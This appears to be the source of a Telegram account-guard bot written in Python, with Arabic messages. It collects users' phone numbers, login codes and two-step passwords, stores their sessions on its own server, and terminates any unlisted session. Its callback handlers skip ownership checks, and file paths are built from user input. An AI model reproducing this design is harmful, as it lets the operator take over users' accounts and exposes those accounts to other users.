import asyncio
import logging
import os
import sys
import time
from datetime import datetime
from typing import Dict, List, Any

from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import *
from motor.motor_asyncio import AsyncIOMotorClient
from dotenv import load_dotenv

# --- الإعدادات ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("UltimateManager")

load_dotenv()

API_ID = int(os.getenv('API_ID', '0'))
API_HASH = os.getenv('API_HASH', '')
BOT_TOKEN = os.getenv('BOT_TOKEN', '')
MONGO_URI = os.getenv('MONGO_URI', 'mongodb://localhost:27017')
DEVELOPER_ID = int(os.getenv('DEVELOPER_ID', '0'))

# --- قاعدة البيانات ---
class Database:
    def __init__(self):
        self.client = AsyncIOMotorClient(MONGO_URI)
        self.db = self.client['telegram_ultimate_manager']
        self.users = self.db['users']
        self.accounts = self.db['accounts']

    async def get_acc(self, acc_id): return await self.accounts.find_one({'_id': acc_id})
    async def save_acc(self, data): await self.accounts.insert_one(data)
    async def update_acc(self, acc_id, data): await self.accounts.update_one({'_id': acc_id}, {'$set': data})
    async def delete_acc(self, acc_id): await self.accounts.delete_one({'_id': acc_id})

db = Database()

# --- محرك السيطرة والمراقبة ---
class ControlEngine:
    def __init__(self, bot):
        self.bot = bot
        self.active_monitors: Dict[str, asyncio.Task] = {}

    async def start_monitor(self, acc):
        acc_id = str(acc['_id'])
        if acc_id not in self.active_monitors:
            self.active_monitors[acc_id] = asyncio.create_task(self._monitor_loop(acc))

    async def _monitor_loop(self, acc):
        acc_id = str(acc['_id'])
        phone = acc['phone']
        owner_id = acc['owner_id']
        
        client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return

            while True:
                current = await db.get_acc(acc_id)
                if not current or not current.get('monitoring'): break

                auths = await client(functions.account.GetAuthorizationsRequest())
                safe_hashes = current.get('existing_sessions', [])
                
                for auth in auths.authorizations:
                    if auth.hash not in safe_hashes:
                        await self._report_and_kill(client, auth, owner_id, phone)
                
                await asyncio.sleep(20)
        except Exception as e:
            logger.error(f"Monitor error {phone}: {e}")
        finally:
            await client.disconnect()

    async def _report_and_kill(self, client, auth, owner_id, phone):
        detail_msg = (
            f"🚨 **تنبيه أمني: دخول جديد مكتشف!**\n\n"
            f"📱 **الحساب:** `{phone}`\n"
            f"━━━━━━━━━━━━━━\n"
            f"💻 **الجهاز:** `{auth.device_model}`\n"
            f"🌐 **النظام:** `{auth.platform} {auth.system_version}`\n"
            f"📍 **الدولة:** `{auth.country}`\n"
            f"🌐 **عنوان IP:** `{auth.ip}`\n"
            f"⏰ **الوقت:** `{auth.date_created}`\n"
            f"━━━━━━━━━━━━━━\n"
            f"🛡 **الإجراء:** تم طرد الجلسة تلقائياً وتأمين الحساب."
        )
        try:
            await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
            await self.bot.send_message(owner_id, detail_msg)
        except Exception as e:
            await self.bot.send_message(owner_id, f"❌ **فشل طرد الجلسة:** {e}")

# --- البوت الرئيسي ---
class UltimateBot:
    def __init__(self):
        self.bot = TelegramClient('ultimate_bot', API_ID, API_HASH)
        self.engine = ControlEngine(self.bot)
        self.states = {}

    async def run(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        self._setup_handlers()
        async for acc in db.accounts.find({'monitoring': True}):
            await self.engine.start_monitor(acc)
        await self.bot.run_until_disconnected()

    def _setup_handlers(self):
        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start(event):
            uid = event.sender_id
            user = await event.get_sender()
            if uid != DEVELOPER_ID:
                await self.bot.send_message(DEVELOPER_ID, f"👤 **عضو جديد:** {user.first_name}\n🆔 **الآيدي:** `{uid}`\n🔗 **اليوزر:** @{user.username or 'None'}")

            btns = [
                [Button.inline("➕ إضافة حساب", b"add"), Button.inline("📂 حساباتي", b"list")],
                [Button.inline("⚙️ لوحة المطور", b"dev") if uid == DEVELOPER_ID else Button.inline("ℹ️ معلومات", b"info")]
            ]
            await event.respond(f"🚀 **مرحباً بك في مركز السيطرة المتقدم**\n\nيمكنك هنا إدارة حساباتك ومراقبة الجلسات بدقة متناهية.", buttons=btns)

        @self.bot.on(events.CallbackQuery())
        async def cb_handler(event):
            data = event.data
            uid = event.sender_id

            if data == b"list":
                accs = await db.accounts.find({'owner_id': uid}).to_list(100)
                if not accs: return await event.edit("❌ لا توجد حسابات.", buttons=[Button.inline("🔙", b"home")])
                btns = [[Button.inline(f"👤 {a['phone']}", f"view_{a['_id']}".encode())] for a in accs]
                btns.append([Button.inline("🔙 رجوع", b"home")])
                await event.edit("📂 **اختر حساباً للتحكم:**", buttons=btns)

            elif data.startswith(b"view_"):
                acc_id = data.decode().split('_')[1]
                acc = await db.get_acc(acc_id)
                status = "🟢 مراقب" if acc.get('monitoring') else "🔴 غير مراقب"
                btns = [
                    [Button.inline("📱 عرض الجلسات النشطة", f"sessions_{acc_id}".encode())],
                    [Button.inline("🔄 تفعيل/تعطيل المراقبة", f"toggle_{acc_id}".encode())],
                    [Button.inline("🗑 حذف الحساب", f"del_{acc_id}".encode())],
                    [Button.inline("🔙 رجوع", b"list")]
                ]
                await event.edit(f"👤 **الحساب:** `{acc['phone']}`\n🛡 **الحالة:** {status}", buttons=btns)

            elif data.startswith(b"sessions_"):
                acc_id = data.decode().split('_')[1]
                acc = await db.get_acc(acc_id)
                await event.answer("⏳ جاري جلب الجلسات...")
                client = TelegramClient(f'sessions/{acc["phone"]}', API_ID, API_HASH)
                await client.connect()
                auths = await client(functions.account.GetAuthorizationsRequest())
                text = f"📱 **الجلسات النشطة لحساب {acc['phone']}:**\n\n"
                for i, a in enumerate(auths.authorizations, 1):
                    text += (f"{i}. **الجهاز:** `{a.device_model}`\n"
                             f"   **النظام:** `{a.platform}`\n"
                             f"   **الموقع:** `{a.country}`\n"
                             f"   **IP:** `{a.ip}`\n"
                             f"   **التاريخ:** `{a.date_created.strftime('%Y-%m-%d %H:%M')}`\n\n")
                await client.disconnect()
                await event.respond(text, buttons=[Button.inline("🔙 رجوع", f"view_{acc_id}".encode())])

            elif data.startswith(b"toggle_"):
                acc_id = data.decode().split('_')[1]
                acc = await db.get_acc(acc_id)
                new_val = not acc.get('monitoring')
                await db.update_acc(acc_id, {'monitoring': new_val})
                if new_val: await self.engine.start_monitor(acc)
                await event.answer(f"تم {'تفعيل' if new_val else 'تعطيل'} المراقبة")
                await cb_handler(event)

            elif data == b"add":
                self.states[uid] = {'step': 'phone'}
                await event.edit("📱 أرسل رقم الهاتف مع رمز الدولة:", buttons=[Button.inline("❌ إلغاء", b"home")])

            elif data == b"home":
                await start(event)

        @self.bot.on(events.NewMessage())
        async def add_process(event):
            uid = event.sender_id
            if uid not in self.states: return
            state = self.states[uid]
            text = event.text.strip()

            if state['step'] == 'phone':
                client = TelegramClient(f'sessions/{text}', API_ID, API_HASH)
                await client.connect()
                try:
                    req = await client.send_code_request(text)
                    state.update({'step': 'code', 'phone': text, 'client': client, 'hash': req.phone_code_hash})
                    await event.respond("📩 أرسل كود التحقق:")
                except Exception as e: await event.respond(f"❌ خطأ: {e}")

            elif state['step'] == 'code':
                try:
                    await state['client'].sign_in(state['phone'], text, phone_code_hash=state['hash'])
                    await self._finalize(uid, state['phone'], state['client'])
                    await event.respond("✅ تم الإضافة بنجاح!")
                    self.states.pop(uid)
                except SessionPasswordNeededError:
                    state['step'] = 'pass'
                    await event.respond("🔐 أرسل كلمة السر:")
                except Exception as e: await event.respond(f"❌ خطأ: {e}")

            elif state['step'] == 'pass':
                try:
                    await state['client'].sign_in(password=text)
                    await self._finalize(uid, state['phone'], state['client'])
                    await event.respond("✅ تم الدخول!")
                    self.states.pop(uid)
                except Exception as e: await event.respond(f"❌ خطأ: {e}")

    async def _finalize(self, owner_id, phone, client):
        auths = await client(functions.account.GetAuthorizationsRequest())
        hashes = [a.hash for a in auths.authorizations]
        acc_id = str(time.time()).replace('.', '')
        acc = {'_id': acc_id, 'owner_id': owner_id, 'phone': phone, 'monitoring': True, 'existing_sessions': hashes, 'created_at': datetime.now()}
        await db.save_acc(acc)
        await self.engine.start_monitor(acc)
        await client.disconnect()

if __name__ == '__main__':
    if not os.path.exists('sessions'): os.makedirs('sessions')
    asyncio.run(UltimateBot().run())
